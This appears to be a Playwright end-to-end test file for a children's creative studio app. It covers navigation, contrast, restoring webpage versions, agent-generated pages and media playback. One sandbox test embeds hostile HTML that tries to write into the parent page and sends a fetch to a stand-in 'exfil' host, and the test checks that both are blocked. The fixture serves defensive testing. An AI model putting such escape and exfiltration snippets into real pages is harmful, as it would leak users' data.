import { expect, test } from "@playwright/test";
import { mockAgentWorkspace } from "./agent-fixture";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

test("web and agent studios share navigation and fit desktop and mobile screens", async ({ page }) => {
  await mockAgentWorkspace(page);
  for (const width of [1440, 390]) {
    await page.setViewportSize({ width, height: 900 });
    for (const path of ["/workspace/chat", "/workspace/image", "/workspace/music", "/workspace/video", "/workspace/html", "/agents"]) {
      await page.goto(path);
      const navigation = page.getByRole("navigation", { name: "创作小屋导航" });
      await expect(navigation).toBeVisible();
      await expect(navigation.getByRole("link")).toHaveCount(6);
      await expect(navigation.locator('[aria-current="page"]')).toHaveAttribute("href", path);
      expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
      if (path === "/agents") {
        const contrast = await page.getByLabel("测试问题").evaluate((element) => {
          const style = getComputedStyle(element);
          const luminance = (color: string) => {
            const channels = color.match(/[\d.]+/g)!.slice(0, 3).map(Number).map((value) => value / 255).map((value) => value <= .04045 ? value / 12.92 : ((value + .055) / 1.055) ** 2.4);
            return channels[0] * .2126 + channels[1] * .7152 + channels[2] * .0722;
          };
          const foreground = luminance(style.color); const background = luminance(style.backgroundColor);
          return (Math.max(foreground, background) + .05) / (Math.min(foreground, background) + .05);
        });
        expect(contrast).toBeGreaterThanOrEqual(4.5);
      }
    }
  }
});

test("web versions can be previewed and restored without deleting newer versions", async ({ page }) => {
  await mockAgentWorkspace(page);
  const versions = [
    { versionId: "web-student-e2e-v1", title: "森林", html: '<html><body><h1>森林</h1><button onclick="this.textContent=\'找到星星\'">探索</button></body></html>', teachingSteps: ["认识按钮"] },
    { versionId: "web-student-e2e-v2", title: "海洋", html: '<html><body><h1>海洋</h1></body></html>', teachingSteps: ["修改标题"] },
  ];
  let current = 1;
  await page.route("**/projects/html", (route) => route.fulfill({ json: { projects: [{ projectId: "web-student-e2e", title: "海洋" }] } }));
  await page.route("**/projects/web-student-e2e/html**", (route) => {
    const path = new URL(route.request().url()).pathname;
    if (path.endsWith("/restore")) { current = 0; return route.fulfill({ json: { currentVersionId: versions[current].versionId } }); }
    if (path.includes("/versions/")) return route.fulfill({ json: { currentVersion: versions[0] } });
    return route.fulfill({ json: { projectId: "web-student-e2e", currentVersionId: versions[current].versionId, currentVersion: versions[current], versions } });
  });
  await page.goto("/workspace/html");
  await page.getByLabel("选择历史版本").selectOption("web-student-e2e-v1");
  const preview = page.frameLocator('iframe[title="网页预览"]');
  await expect(preview.getByRole("heading", { name: "森林" })).toBeVisible();
  await preview.getByRole("button", { name: "探索" }).click();
  await expect(preview.getByRole("button", { name: "找到星星" })).toBeVisible();
  await page.getByRole("button", { name: "恢复此版本" }).click();
  await expect(page.getByText("已恢复所选版本，接下来会基于这个版本继续修改。")).toBeVisible();
  await expect(page.getByLabel("选择历史版本").locator("option")).toHaveCount(2);
  await page.reload();
  await expect(preview.getByRole("heading", { name: "森林" })).toBeVisible();
});

test("agent creates an interactive webpage and downloads it", async ({ page }) => {
  await mockAgentWorkspace(page);
  await page.goto("/agents");
  await page.getByLabel("选择大模型").selectOption("deepseek-class");
  await page.getByLabel("输出类型").selectOption("html");
  await page.getByLabel("测试问题").fill("做一个找星星的网页");
  await page.getByRole("button", { name: "发送", exact: true }).click();
  const preview = page.frameLocator('iframe[title="智能体生成的网页"]');
  await preview.getByRole("button", { name: "探索" }).click();
  await expect(preview.getByRole("button", { name: "找到星星" })).toBeVisible();
  const download = page.waitForEvent("download");
  await page.getByRole("button", { name: "下载网页" }).click();
  expect((await download).suggestedFilename()).toBe("my-agent-webpage.html");
});

test("production HTML sandbox allows play but blocks parent access and network requests", async ({ page }) => {
  await mockAgentWorkspace(page);
  const source = '<html><body><button onclick="document.getElementById(\'score\').textContent=1;try{parent.document.body.dataset.hacked=\'yes\'}catch{document.getElementById(\'guard\').textContent=\'页面已隔离\'}">开始游戏</button><p id="score">0</p><p id="guard">待检查</p><p id="network">等待</p><script>fetch("https://outside.invalid/exfil").catch(()=>document.getElementById("network").textContent="网络已隔离")</script></body></html>';
  const html = execFileSync("python3", ["-c", "import sys; from packages.sandbox.src.html_sanitizer import prepare_interactive_html; print(prepare_interactive_html(sys.argv[1]))", source], { cwd: fileURLToPath(new URL("../../../", import.meta.url)), encoding: "utf8" });
  let externalRequests = 0;
  await page.route("https://outside.invalid/**", (route) => { externalRequests++; return route.abort(); });
  await page.route("**/projects/web-student-e2e/html", (route) => route.fulfill({ json: { projectId: "web-student-e2e", currentVersion: { versionId: "v1", title: "游戏", html, teachingSteps: [] } } }));
  await page.goto("/workspace/html");
  const frame = page.frameLocator('iframe[title="网页预览"]');
  await frame.getByRole("button", { name: "开始游戏" }).click();
  await expect(frame.getByText("页面已隔离")).toBeVisible();
  await expect(frame.getByText("网络已隔离")).toBeVisible();
  await expect(frame.locator("#score")).toHaveText("1");
  expect(await page.evaluate(() => document.body.dataset.hacked)).toBeUndefined();
  expect(externalRequests).toBe(0);
});

for (const kind of ["music", "video", "image"]) {
  test("agent displays completed " + kind + " with playable media", async ({ page }) => {
    await mockAgentWorkspace(page);
    await page.route("**/media/jobs/job-1", (route) => route.fulfill({ json: { jobId: "job-1", kind, state: "succeeded", assetId: "media-work", progress: 100 } }));
    await page.route("**/works/media-work", (route) => route.fulfill({ json: { assetId: "media-work", kind, title: "魔法森林", previewUrl: "/samples/magic-brush.mp4", lyrics: "一闪一闪小星星", durationSeconds: 5 } }));
    await page.goto("/agents");
    await page.getByLabel("选择大模型").selectOption("deepseek-class");
    await page.getByLabel("输出类型").selectOption(kind);
    await page.getByLabel("测试问题").fill("创作魔法森林");
    await page.getByRole("button", { name: "发送", exact: true }).click();
    if (kind === "music") { await expect(page.locator("audio[controls]")).toBeVisible(); await expect(page.getByText("一闪一闪小星星")).toBeVisible(); }
    else if (kind === "video") { await expect(page.locator("video[controls]")).toBeVisible(); await expect(page.locator("video")).toHaveAttribute("playsinline", ""); }
    else await expect(page.getByAltText("魔法森林")).toBeVisible();
  });
}
